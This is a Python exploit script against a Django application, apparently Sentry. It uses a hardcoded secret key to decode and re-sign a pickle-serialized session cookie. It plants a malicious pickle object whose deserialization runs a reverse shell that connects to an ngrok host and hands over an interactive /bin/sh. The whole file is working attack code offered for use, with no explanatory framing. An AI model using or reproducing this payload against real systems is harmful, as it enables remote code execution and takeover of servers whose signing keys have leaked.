#!/usr/bin/python
import django.core.signing, django.contrib.sessions.serializers
from django.http import HttpResponse
import pickle
import os

SECRET_KEY='14wzd&o9dg1_ukfajt(6)bs5j*nhf2#_=xop^ry_y)5f8m0apq'
#Initial cookie I had on sentry when trying to reset a password
cookie='gASVPQAAAAAAAAB9lIwLbGFzdF92aWV3ZWSUjChkZjg5MTgyYzUwZTBhNjI3NzliM2Q2YTc0MTk1MTg2MjgwN2E0ZjNhlHMu:1hvuBD:1a-59j5J9-jfIXQi_zCAh-_25Kk'
newContent =  django.core.signing.loads(cookie,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies')
print(newContent)
class PickleRce(object):
    def __reduce__(self):
        return (os.system,("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"0.tcp.ngrok.io\",16026));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",))
newContent['testcookie'] = PickleRce()
print(newContent)
print(django.core.signing.dumps(newContent,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies',compress=True)
